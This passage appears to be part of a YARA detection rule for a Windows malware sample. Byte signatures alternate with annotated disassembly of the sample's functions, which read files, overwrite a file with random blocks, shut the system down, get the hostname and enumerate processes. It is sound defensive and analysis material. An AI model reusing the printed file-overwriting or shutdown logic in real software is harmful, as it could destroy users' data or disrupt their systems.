        .text:0x00402b15  33c0             xor eax,eax
        .text:0x00402b17  5e               pop esi
        .text:0x00402b18  5d               pop ebp
        .text:0x00402b19  5b               pop ebx
        .text:0x00402b1a  83c458           add esp,88
        .text:0x00402b1d  c3               ret 
        .text:0x00402b1e  loc_00402b1e: [1 XREFS]
        .text:0x00402b1e  6a00             push 0
        .text:0x00402b20  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402b22  6a00             push 0
        .text:0x00402b24  6880000000       push 128
        .text:0x00402b29  6a03             push 3
        .text:0x00402b2b  6a00             push 0
        .text:0x00402b2d  6a00             push 0
        .text:0x00402b2f  6800000080       push 0x80000000
        .text:0x00402b34  68b8a84000       push 0x0040a8b8
        .text:0x00402b39  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(0x0040a8b8,0x80000000,0,0,3,128,0)
        .text:0x00402b3f  83f8ff           cmp eax,0xffffffff
        .text:0x00402b42  a3aca84000       mov dword [0x0040a8ac],eax
        .text:0x00402b47  7509             jnz 0x00402b52
        .text:0x00402b49  5e               pop esi
        .text:0x00402b4a  5d               pop ebp
        .text:0x00402b4b  33c0             xor eax,eax
        .text:0x00402b4d  5b               pop ebx
        .text:0x00402b4e  83c458           add esp,88
        .text:0x00402b51  c3               ret 
        .text:0x00402b52  loc_00402b52: [1 XREFS]
        .text:0x00402b52  6a00             push 0
        .text:0x00402b54  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402b56  a1aca84000       mov eax,dword [0x0040a8ac]
        .text:0x00402b5b  6a00             push 0
        .text:0x00402b5d  50               push eax
        .text:0x00402b5e  ff15b0904000     call dword [0x004090b0]    ;kernel32.GetFileSize(kernel32.CreateFileA(0x0040a8b8,0x80000000,0,0,3,128,0),0)
        .text:0x00402b64  6a04             push 4
        .text:0x00402b66  6800300000       push 0x00003000
        .text:0x00402b6b  50               push eax
        .text:0x00402b6c  6a00             push 0
        .text:0x00402b6e  a3a4a84000       mov dword [0x0040a8a4],eax
        .text:0x00402b73  ff1580904000     call dword [0x00409080]    ;kernel32.VirtualAlloc(0,kernel32.GetFileSize(<0x00402b39>,0),0x00003000,4)
        .text:0x00402b79  6a00             push 0
        .text:0x00402b7b  a3b4a84000       mov dword [0x0040a8b4],eax
        .text:0x00402b80  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402b82  8b0da4a84000     mov ecx,dword [0x0040a8a4]
        .text:0x00402b88  8b15b4a84000     mov edx,dword [0x0040a8b4]
        .text:0x00402b8e  a1aca84000       mov eax,dword [0x0040a8ac]
        .text:0x00402b93  6a00             push 0
        .text:0x00402b95  68a8a84000       push 0x0040a8a8
        .text:0x00402b9a  51               push ecx
        .text:0x00402b9b  52               push edx
        .text:0x00402b9c  50               push eax
        .text:0x00402b9d  ff15b4904000     call dword [0x004090b4]    ;kernel32.ReadFile(<0x00402b39>,kernel32.VirtualAlloc(0,<0x00402b5e>,0x00003000,4),<0x00402b5e>,0x0040a8a8,0)
        .text:0x00402ba3  6a00             push 0
        .text:0x00402ba5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402ba7  8b0daca84000     mov ecx,dword [0x0040a8ac]
        .text:0x00402bad  51               push ecx
        .text:0x00402bae  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x00402b39>)
        .text:0x00402bb4  6a00             push 0
        .text:0x00402bb6  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402bb8  8b15b4a84000     mov edx,dword [0x0040a8b4]
        .text:0x00402bbe  52               push edx
        .text:0x00402bbf  e80c120000       call 0x00403dd0    ;sub_00403dd0(<0x00402b73>)
        .text:0x00402bc4  83c404           add esp,4
        .text:0x00402bc7  a3b0a84000       mov dword [0x0040a8b0],eax
        .text:0x00402bcc  85c0             test eax,eax
        .text:0x00402bce  7507             jnz 0x00402bd7
        .text:0x00402bd0  5e               pop esi
        .text:0x00402bd1  5d               pop ebp
        .text:0x00402bd2  5b               pop ebx
        .text:0x00402bd3  83c458           add esp,88
        .text:0x00402bd6  c3               ret 
        .text:0x00402bd7  loc_00402bd7: [1 XREFS]
        .text:0x00402bd7  c705bca940000100 mov dword [0x0040a9bc],1
        .text:0x00402be1  loc_00402be1: [1 XREFS]
        .text:0x00402be1  6a00             push 0
        .text:0x00402be3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402be5  8b442470         mov eax,dword [esp + 112]
        .text:0x00402be9  8b0db0a84000     mov ecx,dword [0x0040a8b0]
        .text:0x00402bef  50               push eax
        .text:0x00402bf0  51               push ecx
        .text:0x00402bf1  e84a160000       call 0x00404240    ;sub_00404240(0,arg2)
        .text:0x00402bf6  83c408           add esp,8
        .text:0x00402bf9  85c0             test eax,eax
        .text:0x00402bfb  7431             jz 0x00402c2e
        .text:0x00402bfd  8b542474         mov edx,dword [esp + 116]
        .text:0x00402c01  8b4c240c         mov ecx,dword [esp + 12]
        .text:0x00402c05  52               push edx
        .text:0x00402c06  8b542414         mov edx,dword [esp + 20]
        .text:0x00402c0a  51               push ecx
        .text:0x00402c0b  8b4c241c         mov ecx,dword [esp + 28]
        .text:0x00402c0f  52               push edx
        .text:0x00402c10  8b1528a04000     mov edx,dword [0x0040a028]
        .text:0x00402c16  51               push ecx
        .text:0x00402c17  8b4c2478         mov ecx,dword [esp + 120]
        .text:0x00402c1b  6834ac4000       push 0x0040ac34
        .text:0x00402c20  52               push edx
        .text:0x00402c21  68c8a94000       push 0x0040a9c8
        .text:0x00402c26  51               push ecx
        .text:0x00402c27  ffd0             call eax    ;UnknownApi()
        .text:0x00402c29  83c420           add esp,32
        .text:0x00402c2c  8be8             mov ebp,eax
        .text:0x00402c2e  loc_00402c2e: [1 XREFS]
        .text:0x00402c2e  8bc5             mov eax,ebp
        .text:0x00402c30  5e               pop esi
        .text:0x00402c31  5d               pop ebp
        .text:0x00402c32  5b               pop ebx
        .text:0x00402c33  83c458           add esp,88
        .text:0x00402c36  c3               ret 
        */
        $c42 = { 83 EC 58 8B 15 ?? ?? ?? ?? B0 31 88 44 24 ?? 88 44 24 ?? A0 ?? ?? ?? ?? B1 56 88 44 24 ?? 8B 04 95 ?? ?? ?? ?? 53 89 44 24 ?? A1 ?? ?? ?? ?? 55 88 4C 24 ?? 88 4C 24 ?? 8A 0D ?? ?? ?? ?? 33 ED B3 53 56 8B 35 ?? ?? ?? ?? C6 44 24 ?? 49 85 C0 C6 44 24 ?? 44 C6 44 24 ?? 3A C6 44 24 ?? 32 C6 44 24 ?? 30 C6 44 24 ?? 33 C6 44 24 ?? 2D 88 5C 24 ?? C6 44 24 ?? 00 88 4C 24 ?? 0F 85 ?? ?? ?? ?? 8B 4C 24 ?? 51 E8 ?? ?? ?? ?? 83 C4 04 55 FF D6 68 B8 A8 40 00 FF 15 ?? ?? ?? ?? 83 F8 FF 74 ?? 57 B9 0C 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 8D 54 24 ?? F3 AB 52 68 B8 A8 40 00 AA 88 5C 24 ?? 88 5C 24 ?? 88 5C 24 ?? 88 5C 24 ?? 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 00 E8 ?? ?? ?? ?? 83 C4 08 85 C0 5F 74 ?? 8B 0D ?? ?? ?? ?? 83 C0 06 50 8D 44 24 ?? 50 E8 ?? ?? ?? ?? 8D 4C 24 ?? 8D 54 24 ?? 51 8B 0D ?? ?? ?? ?? 52 E8 ?? ?? ?? ?? 85 C0 74 ?? 6A 01 68 B8 A8 40 00 E8 ?? ?? ?? ?? 83 C4 08 33 C0 5E 5D 5B 83 C4 58 C3 6A 00 FF D6 6A 00 68 80 00 00 00 6A 03 6A 00 6A 00 68 00 00 00 80 68 B8 A8 40 00 FF 15 ?? ?? ?? ?? 83 F8 FF A3 ?? ?? ?? ?? 75 ?? 5E 5D 33 C0 5B 83 C4 58 C3 6A 00 FF D6 A1 ?? ?? ?? ?? 6A 00 50 FF 15 ?? ?? ?? ?? 6A 04 68 00 30 00 00 50 6A 00 A3 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 6A 00 A3 ?? ?? ?? ?? FF D6 8B 0D ?? ?? ?? ?? 8B 15 ?? ?? ?? ?? A1 ?? ?? ?? ?? 6A 00 68 A8 A8 40 00 51 52 50 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 0D ?? ?? ?? ?? 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 15 ?? ?? ?? ?? 52 E8 ?? ?? ?? ?? 83 C4 04 A3 ?? ?? ?? ?? 85 C0 75 ?? 5E 5D 5B 83 C4 58 C3 C7 05 ?? ?? ?? ?? 01 00 00 00 6A 00 FF D6 8B 44 24 ?? 8B 0D ?? ?? ?? ?? 50 51 E8 ?? ?? ?? ?? 83 C4 08 85 C0 74 ?? 8B 54 24 ?? 8B 4C 24 ?? 52 8B 54 24 ?? 51 8B 4C 24 ?? 52 8B 15 ?? ?? ?? ?? 51 8B 4C 24 ?? 68 34 AC 40 00 52 68 C8 A9 40 00 51 FF D0 83 C4 20 8B E8 8B C5 5E 5D 5B 83 C4 58 C3 }
        /*
function at 0x00405800@9324d1a8ae37a36ae560c37448c9705a with 2 features:
          - get file size
          - write file on Windows
        .text:0x00405800  
        .text:0x00405800  FUNC: int cdecl sub_00405800( int arg0, ) [2 XREFS] 
        .text:0x00405800  
        .text:0x00405800  Stack Variables: (offset from initial top of stack)
        .text:0x00405800             4: int arg0
        .text:0x00405800          -1023: int local1023
        .text:0x00405800          -1024: int local1024
        .text:0x00405800          -1028: int local1028
        .text:0x00405800          -1032: int local1032
        .text:0x00405800  
        .text:0x00405800  66a162a54000     mov ax,word [0x0040a562]
        .text:0x00405806  81ec08040000     sub esp,1032
        .text:0x0040580c  6685c0           test ax,ax
        .text:0x0040580f  53               push ebx
        .text:0x00405810  55               push ebp
        .text:0x00405811  56               push esi
        .text:0x00405812  0f84fa000000     jz 0x00405912
        .text:0x00405818  8b3578904000     mov esi,dword [0x00409078]
        .text:0x0040581e  33ed             xor ebp,ebp
        .text:0x00405820  668be8           mov bp,ax
        .text:0x00405823  6a00             push 0
        .text:0x00405825  c1e50a           shl ebp,10
        .text:0x00405828  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040582a  8b842418040000   mov eax,dword [esp + 1048]
        .text:0x00405831  6a00             push 0
        .text:0x00405833  6880000000       push 128
        .text:0x00405838  6a04             push 4
        .text:0x0040583a  6a00             push 0
        .text:0x0040583c  6a02             push 2
        .text:0x0040583e  6800000040       push 0x40000000
        .text:0x00405843  50               push eax
        .text:0x00405844  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(arg0,0x40000000,2,0,4,128,0)
        .text:0x0040584a  8bd8             mov ebx,eax
        .text:0x0040584c  83fbff           cmp ebx,0xffffffff
        .text:0x0040584f  895c2410         mov dword [esp + 16],ebx
        .text:0x00405853  0f84b9000000     jz 0x00405912
        .text:0x00405859  57               push edi
        .text:0x0040585a  6a00             push 0
        .text:0x0040585c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040585e  6a02             push 2
        .text:0x00405860  6a00             push 0
        .text:0x00405862  6a00             push 0
        .text:0x00405864  53               push ebx
        .text:0x00405865  ff15a8904000     call dword [0x004090a8]    ;kernel32.SetFilePointer(kernel32.CreateFileA(arg0,0x40000000,2,0,4,128,0),0,0,2)
        .text:0x0040586b  6a00             push 0
        .text:0x0040586d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040586f  6a00             push 0
        .text:0x00405871  53               push ebx
        .text:0x00405872  ff15b0904000     call dword [0x004090b0]    ;kernel32.GetFileSize(<0x00405844>,0)
        .text:0x00405878  6a00             push 0
        .text:0x0040587a  8bf8             mov edi,eax
        .text:0x0040587c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040587e  8bcd             mov ecx,ebp
        .text:0x00405880  c1e10a           shl ecx,10
        .text:0x00405883  3bcf             cmp ecx,edi
        .text:0x00405885  767b             jbe 0x00405902
        .text:0x00405887  b9ff000000       mov ecx,255
        .text:0x0040588c  33c0             xor eax,eax
        .text:0x0040588e  8d7c2419         lea edi,dword [esp + 25]
        .text:0x00405892  c644241800       mov byte [esp + 24],0
        .text:0x00405897  f3ab             rep: stosd 
        .text:0x00405899  66ab             stosd 
        .text:0x0040589b  aa               stosb 
        .text:0x0040589c  33ff             xor edi,edi
        .text:0x0040589e  c744241000000000 mov dword [esp + 16],0
        .text:0x004058a6  85ed             test ebp,ebp
        .text:0x004058a8  7658             jbe 0x00405902
        .text:0x004058aa  loc_004058aa: [1 XREFS]
        .text:0x004058aa  f7c7ff030000     test edi,1023
        .text:0x004058b0  752b             jnz 0x004058dd
        .text:0x004058b2  33db             xor ebx,ebx
        .text:0x004058b4  loc_004058b4: [1 XREFS]
        .text:0x004058b4  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004058ba  e8d1efffff       call 0x00404890    ;sub_00404890()
        .text:0x004058bf  02c3             add al,bl
        .text:0x004058c1  b9ff000000       mov ecx,255
        .text:0x004058c6  0fbec0           movsx eax,al
        .text:0x004058c9  99               cdq 
        .text:0x004058ca  f7f9             idiv ecx
        .text:0x004058cc  43               inc ebx
        .text:0x004058cd  81fb00040000     cmp ebx,1024
        .text:0x004058d3  88541c17         mov byte [esp + ebx + 23],dl
        .text:0x004058d7  7cdb             jl 0x004058b4
        .text:0x004058d9  8b5c2414         mov ebx,dword [esp + 20]
        .text:0x004058dd  loc_004058dd: [1 XREFS]
        .text:0x004058dd  6a00             push 0
        .text:0x004058df  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004058e1  8d542410         lea edx,dword [esp + 16]
        .text:0x004058e5  6a00             push 0
        .text:0x004058e7  52               push edx
        .text:0x004058e8  8d442420         lea eax,dword [esp + 32]
        .text:0x004058ec  6800040000       push 1024
        .text:0x004058f1  50               push eax
        .text:0x004058f2  53               push ebx
        .text:0x004058f3  ff15a4904000     call dword [0x004090a4]    ;kernel32.WriteFile(<0x00405844>,local1024,1024,local1032,0)
        .text:0x004058f9  6a00             push 0
        .text:0x004058fb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004058fd  47               inc edi
        .text:0x004058fe  3bfd             cmp edi,ebp
        .text:0x00405900  72a8             jc 0x004058aa
        .text:0x00405902  loc_00405902: [2 XREFS]
        .text:0x00405902  6a00             push 0
        .text:0x00405904  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405906  53               push ebx
        .text:0x00405907  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x00405844>)
        .text:0x0040590d  6a00             push 0
        .text:0x0040590f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405911  5f               pop edi
        .text:0x00405912  loc_00405912: [2 XREFS]
        .text:0x00405912  5e               pop esi
        .text:0x00405913  5d               pop ebp
        .text:0x00405914  5b               pop ebx
        .text:0x00405915  81c408040000     add esp,1032
        .text:0x0040591b  c3               ret 
        */
        $c43 = { 66 A1 ?? ?? ?? ?? 81 EC 08 04 00 00 66 85 C0 53 55 56 0F 84 ?? ?? ?? ?? 8B 35 ?? ?? ?? ?? 33 ED 66 8B E8 6A 00 C1 E5 0A FF D6 8B 84 24 ?? ?? ?? ?? 6A 00 68 80 00 00 00 6A 04 6A 00 6A 02 68 00 00 00 40 50 FF 15 ?? ?? ?? ?? 8B D8 83 FB FF 89 5C 24 ?? 0F 84 ?? ?? ?? ?? 57 6A 00 FF D6 6A 02 6A 00 6A 00 53 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 53 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8B CD C1 E1 0A 3B CF 76 ?? B9 FF 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 F3 AB 66 AB AA 33 FF C7 44 24 ?? 00 00 00 00 85 ED 76 ?? F7 C7 FF 03 00 00 75 ?? 33 DB 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 02 C3 B9 FF 00 00 00 0F BE C0 99 F7 F9 43 81 FB 00 04 00 00 88 54 1C ?? 7C ?? 8B 5C 24 ?? 6A 00 FF D6 8D 54 24 ?? 6A 00 52 8D 44 24 ?? 68 00 04 00 00 50 53 FF 15 ?? ?? ?? ?? 6A 00 FF D6 47 3B FD 72 ?? 6A 00 FF D6 53 FF 15 ?? ?? ?? ?? 6A 00 FF D6 5F 5E 5D 5B 81 C4 08 04 00 00 C3 }
        /*
function at 0x00402790@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - read file on Windows
        .text:0x00402790  
        .text:0x00402790  FUNC: int cdecl sub_00402790( int arg0, int arg1, ) [2 XREFS] 
        .text:0x00402790  
        .text:0x00402790  Stack Variables: (offset from initial top of stack)
        .text:0x00402790             8: int arg1
        .text:0x00402790             4: int arg0
        .text:0x00402790            -4: int local4
        .text:0x00402790  
        .text:0x00402790  51               push ecx
        .text:0x00402791  53               push ebx
        .text:0x00402792  56               push esi
        .text:0x00402793  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00402799  57               push edi
        .text:0x0040279a  6a00             push 0
        .text:0x0040279c  c744241000000000 mov dword [esp + 16],0
        .text:0x004027a4  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004027a6  8b442414         mov eax,dword [esp + 20]
        .text:0x004027aa  6a00             push 0
        .text:0x004027ac  6a00             push 0
        .text:0x004027ae  6a03             push 3
        .text:0x004027b0  6a00             push 0
        .text:0x004027b2  6a01             push 1
        .text:0x004027b4  6800000080       push 0x80000000
        .text:0x004027b9  50               push eax
        .text:0x004027ba  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(arg0,0x80000000,1,0,3,0,0)
        .text:0x004027c0  8bf8             mov edi,eax
        .text:0x004027c2  83ffff           cmp edi,0xffffffff
        .text:0x004027c5  7507             jnz 0x004027ce
        .text:0x004027c7  5f               pop edi
        .text:0x004027c8  5e               pop esi
        .text:0x004027c9  33c0             xor eax,eax
        .text:0x004027cb  5b               pop ebx
        .text:0x004027cc  59               pop ecx
        .text:0x004027cd  c3               ret 
        .text:0x004027ce  loc_004027ce: [1 XREFS]
        .text:0x004027ce  6a00             push 0
        .text:0x004027d0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004027d2  6a02             push 2
        .text:0x004027d4  6a00             push 0
        .text:0x004027d6  6800fcffff       push 0xfffffc00
        .text:0x004027db  57               push edi
        .text:0x004027dc  ff15a8904000     call dword [0x004090a8]    ;kernel32.SetFilePointer(kernel32.CreateFileA(arg0,0x80000000,1,0,3,0,0),0xfffffc00,0,2)
        .text:0x004027e2  6800040000       push 1024
        .text:0x004027e7  e810560000       call 0x00407dfc    ;msvcrt.??2@YAPAXI@Z(1024)
        .text:0x004027ec  83c404           add esp,4
        .text:0x004027ef  8bd8             mov ebx,eax
        .text:0x004027f1  6a00             push 0
        .text:0x004027f3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004027f5  8d4c240c         lea ecx,dword [esp + 12]
        .text:0x004027f9  6a00             push 0
        .text:0x004027fb  51               push ecx
        .text:0x004027fc  6800040000       push 1024
        .text:0x00402801  53               push ebx
        .text:0x00402802  57               push edi
        .text:0x00402803  ff15b4904000     call dword [0x004090b4]    ;kernel32.ReadFile(<0x004027ba>,msvcrt.??2@YAPAXI@Z(1024),1024,local4,0)
        .text:0x00402809  6a00             push 0
        .text:0x0040280b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040280d  57               push edi
        .text:0x0040280e  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x004027ba>)
        .text:0x00402814  6a00             push 0
        .text:0x00402816  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402818  8b542418         mov edx,dword [esp + 24]
        .text:0x0040281c  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00402822  6a00             push 0
        .text:0x00402824  6800040000       push 1024
        .text:0x00402829  52               push edx
        .text:0x0040282a  53               push ebx
        .text:0x0040282b  e8701f0000       call 0x004047a0    ;sub_004047a0(<0x004027e7>,arg1,1024,0)
        .text:0x00402830  83f8ff           cmp eax,0xffffffff
        .text:0x00402833  7510             jnz 0x00402845
        .text:0x00402835  53               push ebx
        .text:0x00402836  e8a5550000       call 0x00407de0    ;msvcrt.??3@YAXPAX@Z(<0x004027e7>)
        .text:0x0040283b  83c404           add esp,4
        .text:0x0040283e  33c0             xor eax,eax
        .text:0x00402840  5f               pop edi
        .text:0x00402841  5e               pop esi
        .text:0x00402842  5b               pop ebx
        .text:0x00402843  59               pop ecx
        .text:0x00402844  c3               ret 
        .text:0x00402845  loc_00402845: [1 XREFS]
        .text:0x00402845  5f               pop edi
        .text:0x00402846  03c3             add eax,ebx
        .text:0x00402848  5e               pop esi
        .text:0x00402849  5b               pop ebx
        .text:0x0040284a  59               pop ecx
        .text:0x0040284b  c3               ret 
        */
        $c44 = { 51 53 56 8B 35 ?? ?? ?? ?? 57 6A 00 C7 44 24 ?? 00 00 00 00 FF D6 8B 44 24 ?? 6A 00 6A 00 6A 03 6A 00 6A 01 68 00 00 00 80 50 FF 15 ?? ?? ?? ?? 8B F8 83 FF FF 75 ?? 5F 5E 33 C0 5B 59 C3 6A 00 FF D6 6A 02 6A 00 68 00 FC FF FF 57 FF 15 ?? ?? ?? ?? 68 00 04 00 00 E8 ?? ?? ?? ?? 83 C4 04 8B D8 6A 00 FF D6 8D 4C 24 ?? 6A 00 51 68 00 04 00 00 53 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 54 24 ?? 8B 0D ?? ?? ?? ?? 6A 00 68 00 04 00 00 52 53 E8 ?? ?? ?? ?? 83 F8 FF 75 ?? 53 E8 ?? ?? ?? ?? 83 C4 04 33 C0 5F 5E 5B 59 C3 5F 03 C3 5E 5B 59 C3 }
        /*
function at 0x00403ba0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - shutdown system
        .text:0x00403ba0  
        .text:0x00403ba0  FUNC: int thiscall_caller sub_00403ba0( void * ecx, int arg1, ) [2 XREFS] 
        .text:0x00403ba0  
        .text:0x00403ba0  Stack Variables: (offset from initial top of stack)
        .text:0x00403ba0             4: int arg1
        .text:0x00403ba0  
        .text:0x00403ba0  56               push esi
        .text:0x00403ba1  57               push edi
        .text:0x00403ba2  8b3d78904000     mov edi,dword [0x00409078]
        .text:0x00403ba8  8bf1             mov esi,ecx
        .text:0x00403baa  6a00             push 0
        .text:0x00403bac  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00403bae  6a01             push 1
        .text:0x00403bb0  683ca04000       push 0x0040a03c
        .text:0x00403bb5  8bce             mov ecx,esi
        .text:0x00403bb7  e824000000       call 0x00403be0    ;sub_00403be0(0x0040a03c,1)
        .text:0x00403bbc  8b44240c         mov eax,dword [esp + 12]
        .text:0x00403bc0  6a00             push 0
        .text:0x00403bc2  50               push eax
        .text:0x00403bc3  ff15d4914000     call dword [0x004091d4]    ;user32.ExitWindowsEx(arg1,0)
        .text:0x00403bc9  6a00             push 0
        .text:0x00403bcb  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00403bcd  6a00             push 0
        .text:0x00403bcf  683ca04000       push 0x0040a03c
        .text:0x00403bd4  8bce             mov ecx,esi
        .text:0x00403bd6  e805000000       call 0x00403be0    ;sub_00403be0(0x0040a03c,0)
        .text:0x00403bdb  5f               pop edi
        .text:0x00403bdc  5e               pop esi
        .text:0x00403bdd  c20400           ret 4
        */
        $c45 = { 56 57 8B 3D ?? ?? ?? ?? 8B F1 6A 00 FF D7 6A 01 68 3C A0 40 00 8B CE E8 ?? ?? ?? ?? 8B 44 24 ?? 6A 00 50 FF 15 ?? ?? ?? ?? 6A 00 FF D7 6A 00 68 3C A0 40 00 8B CE E8 ?? ?? ?? ?? 5F 5E C2 04 00 }
        /*
function at 0x004050f0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - get hostname
        .text:0x004050f0  
        .text:0x004050f0  FUNC: int cdecl sub_004050f0( int arg0, int arg1, int arg2, ) [2 XREFS] 
        .text:0x004050f0  
        .text:0x004050f0  Stack Variables: (offset from initial top of stack)
        .text:0x004050f0            12: int arg2
        .text:0x004050f0             8: int arg1
        .text:0x004050f0             4: int arg0
        .text:0x004050f0            -4: int local4
        .text:0x004050f0            -5: int local5
        .text:0x004050f0            -6: int local6
        .text:0x004050f0            -7: int local7
        .text:0x004050f0            -8: int local8
        .text:0x004050f0  
        .text:0x004050f0  83ec08           sub esp,8
        .text:0x004050f3  53               push ebx
        .text:0x004050f4  55               push ebp
        .text:0x004050f5  56               push esi
        .text:0x004050f6  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004050fc  57               push edi
        .text:0x004050fd  6a00             push 0
        .text:0x004050ff  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405101  8b5c2424         mov ebx,dword [esp + 36]
        .text:0x00405105  8b7c2420         mov edi,dword [esp + 32]
        .text:0x00405109  8b4c241c         mov ecx,dword [esp + 28]
        .text:0x0040510d  53               push ebx
        .text:0x0040510e  8d442414         lea eax,dword [esp + 20]
        .text:0x00405112  57               push edi
        .text:0x00405113  50               push eax
        .text:0x00405114  51               push ecx
        .text:0x00405115  c644242048       mov byte [esp + 32],72
        .text:0x0040511a  c64424216f       mov byte [esp + 33],111
        .text:0x0040511f  c644242273       mov byte [esp + 34],115
        .text:0x00405124  c644242374       mov byte [esp + 35],116
        .text:0x00405129  c644242400       mov byte [esp + 36],0
        .text:0x0040512e  e82dfeffff       call 0x00404f60    ;sub_00404f60(arg0,local8,arg1,arg2)
        .text:0x00405133  83c410           add esp,16
        .text:0x00405136  6a00             push 0
        .text:0x00405138  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040513a  8b2dc4904000     mov ebp,dword [0x004090c4]
        .text:0x00405140  57               push edi
        .text:0x00405141  ffd5             call ebp    ;kernel32.lstrlenA(arg1)
        .text:0x00405143  85c0             test eax,eax
        .text:0x00405145  750f             jnz 0x00405156
        .text:0x00405147  50               push eax
        .text:0x00405148  ffd6             call esi    ;kernel32.Sleep(kernel32.lstrlenA(arg1))
        .text:0x0040514a  53               push ebx
        .text:0x0040514b  57               push edi
        .text:0x0040514c  ff1518924000     call dword [0x00409218]    ;ws2_32.gethostname(arg1,arg2)
        .text:0x00405152  6a00             push 0
        .text:0x00405154  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405156  loc_00405156: [1 XREFS]
        .text:0x00405156  6a00             push 0
        .text:0x00405158  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040515a  57               push edi
        .text:0x0040515b  ffd5             call ebp    ;kernel32.lstrlenA(arg1)
        .text:0x0040515d  5f               pop edi
        .text:0x0040515e  5e               pop esi
        .text:0x0040515f  5d               pop ebp
        .text:0x00405160  5b               pop ebx
        .text:0x00405161  83c408           add esp,8
        .text:0x00405164  c3               ret 
        */
        $c46 = { 83 EC 08 53 55 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 8B 5C 24 ?? 8B 7C 24 ?? 8B 4C 24 ?? 53 8D 44 24 ?? 57 50 51 C6 44 24 ?? 48 C6 44 24 ?? 6F C6 44 24 ?? 73 C6 44 24 ?? 74 C6 44 24 ?? 00 E8 ?? ?? ?? ?? 83 C4 10 6A 00 FF D6 8B 2D ?? ?? ?? ?? 57 FF D5 85 C0 75 ?? 50 FF D6 53 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 57 FF D5 5F 5E 5D 5B 83 C4 08 C3 }
        /*
function at 0x00407970@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - enumerate processes
        .text:0x00407970  
        .text:0x00407970  FUNC: int cdecl sub_00407970( int arg0, ) [4 XREFS] 
        .text:0x00407970  
        .text:0x00407970  Stack Variables: (offset from initial top of stack)
        .text:0x00407970             4: int arg0
        .text:0x00407970  
        .text:0x00407970  55               push ebp
        .text:0x00407971  8bec             mov ebp,esp
        .text:0x00407973  53               push ebx
        .text:0x00407974  56               push esi
        .text:0x00407975  8b3578904000     mov esi,dword [0x00409078]
        .text:0x0040797b  57               push edi
        .text:0x0040797c  6a00             push 0
        .text:0x0040797e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407980  90               nop 
        .text:0x00407981  6a00             push 0
        .text:0x00407983  6a02             push 2
        .text:0x00407985  e854080000       call 0x004081de    ;kernel32.CreateToolhelp32Snapshot(2,0)
        .text:0x0040798a  6a00             push 0
        .text:0x0040798c  8bd8             mov ebx,eax
        .text:0x0040798e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407990  90               nop 
        .text:0x00407991  6828010000       push 296
        .text:0x00407996  e861040000       call 0x00407dfc    ;msvcrt.??2@YAPAXI@Z(296)
        .text:0x0040799b  83c404           add esp,4
        .text:0x0040799e  8bf8             mov edi,eax
        .text:0x004079a0  6a00             push 0
        .text:0x004079a2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079a4  90               nop 
        .text:0x004079a5  6a00             push 0
        .text:0x004079a7  c70728010000     mov dword [edi],296
        .text:0x004079ad  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079af  90               nop 
        .text:0x004079b0  6a00             push 0
        .text:0x004079b2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079b4  57               push edi
        .text:0x004079b5  53               push ebx
        .text:0x004079b6  e81d080000       call 0x004081d8    ;kernel32.Process32First(kernel32.CreateToolhelp32Snapshot(2,0),msvcrt.??2@YAPAXI@Z(296))
        .text:0x004079bb  85c0             test eax,eax
        .text:0x004079bd  7476             jz 0x00407a35
        .text:0x004079bf  6a00             push 0
